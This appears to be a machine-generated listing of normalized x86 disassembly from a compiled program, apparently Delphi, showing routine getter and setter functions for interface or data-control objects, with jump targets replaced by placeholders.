mov [ esp ] eax
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor ebp ebp
mov edx ebp
mov eax esi
call sub_47a4d4
call sub_479bb4
test al al
je r-xdata
mov edx ebp
mov eax esi
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov edx ebx
call sub_480aa0
inc ebp
dec edi
jne r-xdata
mov edx ebp
mov eax esi
call sub_47a4d4
call sub_479bf4
mov edx ebx
call sub_47a72c
mov edx ebp
mov eax esi
call sub_47a4d4
call sub_479bf4
mov edx eax
mov ecx ebx
mov eax [ esp ]
call sub_47a7c0
mov edx ebp
mov eax esi
call sub_47a4d4
cmp [ eax + 0x40 ] 0x0
je r-xdata
sub_47a850
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebp ebp
mov eax edi
call sub_419538
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_47a4d4
cmp [ eax + 0x30 ] 0x0
je r-xdata
sub_47a8a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a96d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a974
lea eax [ ebp - 0x1c ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403324
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_458f18
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f48
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f0c
sub_47a990
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_47aa43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_455920
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
call sub_47b0b8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x64 ]
pop eax
call sub_4042c4
je r-xdata
test bl bl
jne r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47aa4a
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403edc
retn
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
call sub_47b0b8
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_45e254
mov eax [ ebp - 0x8 ]
push eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x64 ]
pop eax
call sub_4042c4
sete bl
sub_47aa54
push ebx
mov ebx eax
mov eax ebx
call sub_455948
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47aa94
push ebx
mov ebx eax
mov eax ebx
call sub_455970
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47aac4
push ebx
mov ebx eax
mov eax ebx
call sub_455998
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x80 ]
call sub_4042c4
je r-xdata
mov al 0x1
pop ebx
retn
sub_47ab08
push ebx
mov ebx eax
mov eax ebx
call sub_4559ac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x80 ]
call sub_4042c4
je r-xdata
mov al 0x1
pop ebx
retn
sub_47ab4c
push ebx
mov ebx eax
mov eax ebx
call sub_42163c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47ab80
push ebx
mov ebx eax
mov eax ebx
call sub_4559c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x48 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47abb4
push ebx
mov ebx eax
mov eax ebx
call sub_4559d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x30 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47abe8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_47b4dc
sub_47ac08
push esi
mov esi eax
mov eax esi
call sub_4559f0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
retn
mov eax [ esi + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47ac34
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x40 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_47ac58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x64 ] esi
sub_47ac74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
add eax 0x80
mov edx esi
call sub_403f0c
sub_47ac9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_47b5b0
sub_47acbc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_47acec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_47b698
sub_47ad0c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_47ad2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x24 ] 0x20000000
xor edx edx
mov eax esi
call sub_4798f4
mov [ esi + 0x58 ] 0xffffffff
xor eax eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x51 ] 0x1
mov [ esi + 0x61 ] 0x1
mov [ esi + 0x52 ] 0x1
mov [ esi + 0x3c ] 0x1
xor eax eax
mov [ esi + 0x44 ] eax
xor eax eax
mov [ esi + 0x5c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_47ad90
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
lea eax [ esi + 0x38 ]
call sub_40d31c
lea eax [ esi + 0x40 ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_479954
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_47adc8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_47aeeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47aef2
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ esi + 0x40 ] 0x0
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_47b4dc
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47b0b8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov dl [ edi + 0x6a ]
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ esi + 0x40 ]
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_47b5b0
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ esi + 0x40 ]
add eax 0x80
mov edx [ edi + 0x7c ]
call sub_403f0c
mov eax [ esi + 0x40 ]
cmp [ eax + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_47b698
cmp [ esi + 0x48 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ esi + 0x40 ]
mov edx [ edi + 0x40 ]
mov [ eax + 0x120 ] edx
mov edx [ edi + 0x44 ]
mov [ eax + 0x124 ] edx
mov eax [ esi + 0x40 ]
cmp [ eax + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
cmp [ esi + 0x30 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x64 ] eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_47aef8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b032
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479a04
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor edx edx
push ebp
push sub_47b015
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov eax esi
call sub_47b0a8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_47b3d0
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_47b0b8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47b4dc
mov eax [ esi + 0x64 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov edx [ esi + 0x58 ]
mov eax [ ebp - 0x4 ]
call sub_47b5b0
mov edx [ esi + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_47b60c
mov edx [ esi + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47b5fc
mov dl [ esi + 0x51 ]
mov eax [ ebp - 0x4 ]
call sub_47b6fc
mov dl [ esi + 0x61 ]
mov eax [ ebp - 0x4 ]
call sub_47b86c
mov dl [ esi + 0x52 ]
mov eax [ ebp - 0x4 ]
call sub_47b754
mov dx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
call sub_47b698
mov edx [ esi + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_47b780
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b01c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_479bf4
push eax
mov eax [ ebp - 0x4 ]
call sub_479bf4
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_47b040
push ebx
mov edx [ eax + 0x40 ]
test edx edx
je r-xdata
pop ebx
retn
mov ecx [ eax + 0x24 ]
mov ebx ecx
sub ebx 0x1fffffff
je r-xdata
mov eax edx
mov dl 0x1
call sub_47fcfc
jmp r-xdata
dec ebx
jne r-xdata
mov eax ecx
xchg edx eax
call sub_44914c
mov eax edx
mov dl 0x1
call sub_449170
jmp r-xdata
sub_47b078
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47b0a8
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
mov cl 0x1
mov edx esi
mov eax ebx
mov si 0xfffd
call sub_403324
sub_47b0b8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
call sub_403f0c
mov eax [ ebx + 0x20 ]
call sub_404178
test eax eax
jne r-xdata
mov eax ebx
call sub_47b0a8
test eax eax
jne r-xdata
push esi
mov eax ebx
call sub_4191a8
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax r-xdata
call sub_408f48
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47b12f
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b1c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4191c0
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47b0b8
mov eax [ ebp - 0x4 ]
call sub_404178
test eax eax
jle r-xdata
mov eax ebx
call sub_47b0a8
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_47b0b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b1d0
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
call sub_47b0a8
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov eax [ ebx + 0x64 ]
call sub_404178
test eax eax
jle r-xdata
mov eax esi
mov edx [ ebx + 0x64 ]
call sub_403f0c
sub_47b1d8
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebx
pop ebp
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x58 ] 0xffffffff
jle r-xdata
mov eax [ ebx + 0x38 ]
call sub_456c40
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x58 ]
jg r-xdata
mov al 0x1
pop ebx
pop ebp
retn
sub_47b214
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x61 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47b0a8
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479c90
test eax eax
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push ebp
mov eax [ ebp - 0x4 ]
call sub_47b0a8
mov eax [ eax + 0x5c ]
call sub_47b1d8
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
call sub_479c90
call sub_479044
call sub_47b1d8
pop ecx
test al al
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_47b284
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47b2fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47b0a8
test eax eax
je r-xdata
mov bl 0x1
mov eax ebx
call sub_47b0a8
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47b0b8
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_47b0a8
mov edx [ eax + 0x64 ]
pop eax
call sub_407f38
test eax eax
setne al
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b301
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_47b320
push ebx
push esi
push edi
mov edi eax
cmp [ edi + 0x44 ] 0xffffffff
je r-xdata
mov eax edi
call sub_47b09c
call sub_479044
mov eax [ eax + 0x6c ]
mov eax [ eax + 0x28 ]
mov [ edi + 0x5c ] eax
mov eax edi
call sub_47b09c
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
inc [ edi + 0x44 ]
mov [ edi + 0x3c ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_47b09c
mov eax [ eax + 0x20 ]
call sub_479c90
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x28 ]
mov [ edi + 0x5c ] eax
mov eax [ esi + 0x20 ]
call sub_479c90
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
call sub_479c90
mov ebx [ eax + 0x20 ]
test ebx ebx
jne r-xdata
mov eax ebx
mov [ eax + 0x3c ] 0x1
cmp [ eax + 0x44 ] 0xffffffff
je r-xdata
mov edx [ edi + 0x5c ]
call sub_47b5fc
inc [ eax + 0x44 ]
sub_47b3d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
mov eax ebx
call sub_47b0a8
cmp edi eax
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_403128
xor eax eax
mov [ ebx + 0x38 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x38 ] 0x0
jne r-xdata
lea eax [ ebx + 0x40 ]
call sub_40d31c
mov edx edi
mov eax [ ebx + 0x38 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x38 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_47b078
test [ edi + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov si 0xfffc
call sub_403324
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x38 ] eax
mov cl 0x1
mov eax ebx
call sub_47b09c
call sub_479044
cmp [ eax + 0x90 ] 0x0
jne r-xdata
mov eax ebx
call sub_47b09c
mov eax [ eax + 0x20 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax ebx
call sub_47b09c
mov eax [ eax + 0x20 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax ebx
call sub_47b09c
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
jmp r-xdata
mov edx edi
mov eax ebx
mov si 0xfffd
call sub_403324
mov eax [ ebx + 0x4 ]
call sub_479044
mov edx eax
mov eax edi
call sub_420e08
mov eax ebx
call sub_47b09c
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax ebx
call sub_47b09c
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x18 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
sub_47b4dc
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax [ edi + 0x20 ]
mov edx esi
call sub_4042c4
je r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x20 ]
mov edx esi
call sub_403f0c
mov eax edi
call sub_47b0a8
test eax eax
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4042c4
je r-xdata
mov [ edi + 0x50 ] bl
test bl bl
je r-xdata
mov bl 0x1
mov eax esi
mov edx r-xdata
call sub_4042c4
je r-xdata
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
call sub_47b3d0
xor edx edx
mov eax edi
call sub_47b698
mov edx esi
call sub_448fdc
sub_47b56c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x40 ]
call sub_40d31c
mov eax esi
mov [ ebx + 0x40 ] eax
test eax eax
je r-xdata
mov eax ebx
call sub_47b0a8
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xfffd
call sub_403324
mov edx ebx
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_47b5b0
push esi
push edi
mov esi eax
cmp edx [ esi + 0x58 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x58 ] edx
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax [ esi + 0x40 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47b5d8
push esi
mov esi eax
mov eax esi
call sub_4192d0
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
call sub_477b70
pop esi
retn
mov edx [ eax ]
call [ edx + 0xcc ]
sub_47b60c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp ebp [ ebx + 0x4c ]
ja r-xdata
mov eax ebx
call sub_4191a8
mov edi eax
inc edi
mov eax ebx
call sub_47b09c
call sub_419538
mov esi eax
dec esi
sub esi edi
jl r-xdata
mov eax ebx
call sub_4191a8
test eax eax
je r-xdata
mov [ ebx + 0x4c ] ebp
inc esi
mov eax ebx
call sub_4191a8
dec eax
push eax
mov eax ebx
call sub_47b09c
pop edx
call sub_47a4d4
cmp [ eax + 0x4c ] 0x0
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ ecx + 0x4c ]
cdq
xor eax edx
sub eax edx
add eax ebp
mov [ ecx + 0x4c ] eax
mov [ ecx + 0x4c ] ebp
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47b09c
mov edx edi
call sub_47a4d4
mov ecx eax
mov eax [ ecx + 0x4c ]
cmp eax [ ebx + 0x4c ]
jne r-xdata
inc edi
dec esi
jne r-xdata
sub_47b698
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b6ed
push [ fs : eax ]
mov [ fs : eax ] esp
cmp si [ ebx + 0x48 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b6f4
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov [ ebx + 0x48 ] si
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_458f18
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x54 ]
call sub_403f0c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
sub_47b6fc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x51 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47b09c
call sub_479044
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ esi + 0x51 ] bl
mov eax esi
call sub_47b214
test al al
jne r-xdata
test bl bl
jne r-xdata
mov al 0x1
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
jmp r-xdata
mov eax edi
call sub_42135c
test eax eax
je r-xdata
mov [ esi + 0x51 ] al
jmp r-xdata
sub_47b754
push esi
push edi
mov esi eax
cmp dl [ esi + 0x52 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x52 ] dl
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax [ esi + 0x40 ]
mov eax [ eax + 0x30 ]
call sub_44c098
sub_47b780
push esi
mov esi eax
cmp edx 0x7fffffff
jne r-xdata
mov [ esi + 0x44 ] edx
xor eax eax
mov [ esi + 0x44 ] eax
jmp r-xdata
pop esi
retn
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ esi + 0x3c ] 0x1
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
sub_47b7a8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x30 ]
jne r-xdata
mov [ esi + 0x30 ] bl
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
cmp bl [ eax + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl [ eax + 0x57 ]
je r-xdata
cmp bl [ edi + 0x57 ]
je r-xdata
mov dl [ esi + 0x30 ]
call sub_448ecc
mov eax [ esi + 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ebx [ edi + 0x30 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov dl [ esi + 0x30 ]
mov eax edi
call sub_448ecc
mov eax ebx
xor edx edx
call sub_448ecc
jmp r-xdata
sub_47b820
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov dl [ esp ]
mov eax ebx
call sub_47a01c
mov eax ebx
call sub_479bd4
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edx
pop ebx
retn
mov eax ebx
call sub_47b09c
mov eax [ eax + 0x20 ]
mov al [ eax + 0x31 ]
cmp al [ ebx + 0x31 ]
jbe r-xdata
mov eax ebx
call sub_479bd4
mov dl [ ebx + 0x31 ]
mov [ eax + 0x31 ] dl
sub_47b86c
push esi
push edi
mov esi eax
cmp dl [ esi + 0x61 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x61 ] dl
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_47b88c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_4192a0
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x40 ]
call sub_40d31c
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov si 0xffcf
call sub_403324
sub_47b8c0
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov bl [ esi + 0x60 ]
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47b09c
